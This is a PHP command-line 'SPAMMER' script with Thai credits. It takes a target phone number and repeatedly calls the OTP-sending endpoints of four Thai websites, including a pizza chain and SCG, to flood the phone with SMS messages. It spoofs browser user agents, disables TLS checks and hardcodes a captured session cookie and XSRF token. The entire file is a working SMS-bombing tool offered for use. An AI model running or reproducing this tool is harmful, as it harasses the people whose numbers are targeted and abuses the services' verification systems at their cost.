<?php
error_reporting(0);
include("ua.php");


function ce($phone, $jum){
	$x = 0;
	while($x < $jum){
		
		$data          = '{"mobile":"'.$phone.'"}';
    $ua            =  random_user_agent();
    $ch            = curl_init();
    $url           =  "https://www.cpsurprise.com/request-otp";
    curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_USERAGENT, $ua);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-ch-ua:"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
        'content-length:' . strlen($data),
        'merchant-id:55',
        'x-xsrf-token: eyJpdiI6ImFDV1k5TlBIbFNuMVJQdDI5QlJ2K0E9PSIsInZhbHVlIjoiN2U1K1NQWlhPZGQwblFHaHhlc2p2NUFJZUx3M2hKQkZ1QTJOVHZGXC92SkJCNk00OGtKMWYwbW1zWEpCOTByNVRjMEd4RWhXNjRLRTA0VWRcL0Z6cXpZUGd3aU9adUJuTWpxN21CSWU1TG5oWDRjaUZ6YnhnMnpKTXk3Vk1xWnFxYyIsIm1hYyI6ImIxYmI5MDc4ZDE0ZjUzYjQ4N2IyMGRmNjhmMDE1NTkwMDk0ODEzMzZmNTM1MWZkMDRlYzlmZGY3NTk3OGZiYWEifQ==',
        ///eyJpdiI6ImFDV1k5TlBIbFNuMVJQdDI5QlJ2K0E9PSIsInZhbHVlIjoiN2U1K1NQWlhPZGQwblFHaHhlc2p2NUFJZUx3M2hKQkZ1QTJOVHZGXC92SkJCNk00OGtKMWYwbW1zWEpCOTByNVRjMEd4RWhXNjRLRTA0VWRcL0Z6cXpZUGd3aU9adUJuTWpxN21CSWU1TG5oWDRjaUZ6YnhnMnpKTXk3Vk1xWnFxYyIsIm1hYyI6ImIxYmI5MDc4ZDE0ZjUzYjQ4N2IyMGRmNjhmMDE1NTkwMDk0ODEzMzZmNTM1MWZkMDRlYzlmZGY3NTk3OGZiYWEifQ==
        'accept:application/json, text/plain, */*',
        'local:th',
        'x-channel:website',
        'x-requested-with:XMLHttpRequest',
        'referer:https://www.cpsurprise.com/register',
        'content-type:application/json;charset=UTF-8',
        'accept-encoding:gzip, deflate, br',
        'accept-language:th',
        'cookie: cpm_frontend_session=n1f65rxhRQapyQVQZPPDP5qeo3hMhutvx2jnIK1V;_ga=GA1.2.1882916347.1631937657;_hjid=0a016ee0-93ea-4429-b217-51af74e8472a;consent_cookie=yes;_gid=GA1.2.401542995.1632306149;_gat_UA-180712387-1=1;_gat_gtag_UA_180712387_1=1;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=1;XSRF-TOKEN=eyJpdiI6ImFDV1k5TlBIbFNuMVJQdDI5QlJ2K0E9PSIsInZhbHVlIjoiN2U1K1NQWlhPZGQwblFHaHhlc2p2NUFJZUx3M2hKQkZ1QTJOVHZGXC92SkJCNk00OGtKMWYwbW1zWEpCOTByNVRjMEd4RWhXNjRLRTA0VWRcL0Z6cXpZUGd3aU9adUJuTWpxN21CSWU1TG5oWDRjaUZ6YnhnMnpKTXk3Vk1xWnFxYyIsIm1hYyI6ImIxYmI5MDc4ZDE0ZjUzYjQ4N2IyMGRmNjhmMDE1NTkwMDk0ODEzMzZmNTM1MWZkMDRlYzlmZGY3NTk3OGZiYWEifQ%3D%3D',
 ));
 $response = curl_exec($ch);
 curl_close($ch);
 $json = json_decode($response);
 echo 'Send => '.$phone.'',"\n";
 $x++;
 flush();
 }
}

function shoponline($phone, $jumshop){
	$x = 0;
	while($x < $jumshop){
		
		$data          = 'phone='.$phone.'&type=phone&resend=0&pinid=';
    $ua            =  random_user_agent();
    $ch            = curl_init();
    $url           =  "https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp";
    curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_USERAGENT, $ua);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-ch-ua:"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'content-length:' . strlen($data),
        'accept:application/json, text/javascript, */*; q=0.01',
        'content-type:application/x-www-form-urlencoded; charset=UTF-8',
        'accept-encoding:gzip, deflate, br',
        'accept-language:th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6',
 ));
 $response = curl_exec($ch);
 curl_close($ch);
 $json = json_decode($response);
 echo 'Send => '.$phone.'',"\n";
 $x++;
 flush();
 }
}


function scg($phone, $jum){
	$x = 0;
	while($x < $jum){
	
    $data          = '{"phone_no":"'.$phone.'"}';
    $ua            =  random_user_agent();
    $ch            = curl_init();
    $url           =  "https://api.scg-id.com/api/otp/send_otp";
    curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_USERAGENT, $ua);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'sec-ch-ua:"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'content-length:' . strlen($data),
        'accept:application/json, text/plain, */*',
        'content-type:application/json',
        'accept-encoding:gzip, deflate, br',
        'accept-language:th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6',
 ));
 $response = curl_exec($ch);
 curl_close($ch);
 $json = json_decode($response);
 echo 'Send => '.$phone.'',"\n";
 $x++;
 flush();
 }
}

function pizza($phone, $jum){
	$x = 0;
	while($x < $jum){
	
    $data          = '{"phonenumber":"'.$phone.'","language":"th"}';
    $ua            =  random_user_agent();
    $ch            = curl_init();
	$url           = "https://api2.1112.com/api/v1/otp/create";
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'sec-ch-ua:"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
        'content-length:' . strlen($data),
        'accept:application/json, text/plain, */*',
        'content-type:application/json;charset=UTF-8',
        'accept-encoding:gzip, deflate, br',
        'accept-language:th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6',
        'referer:https://www.1112.com/',
		));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$response = curl_exec($ch);
	curl_close($ch);
	$json = json_decode($response);
	echo 'Send => '.$phone.'',"\n";
	$x++;
	flush();
	}
}
system('clear');
echo "----SPAMMER----\n";
echo "ขอบคุณ sck ครับ\n";
echo "สร้างโดย Aimbot\n";
echo " \n";
echo "phone : ";
$phone = trim(fgets(STDIN));
echo "jum : ";
$jum = trim(fgets(STDIN));
echo "jumshop ใส่ 1 พอเยอะกว่านี้ไม่ได้\n";
echo "jumshop : ";
$jumshop = trim(fgets(STDIN));
$api1 = pizza($phone, $jum);
$api2 = scg($phone, $jum);
$api3 = shoponline($phone, $jumshop);
$api4 = ce($phone, $jum);
print $api1;
print $api2;
print $api3;
print $api4;


?>
	
echo "ลิ้งค์ :")
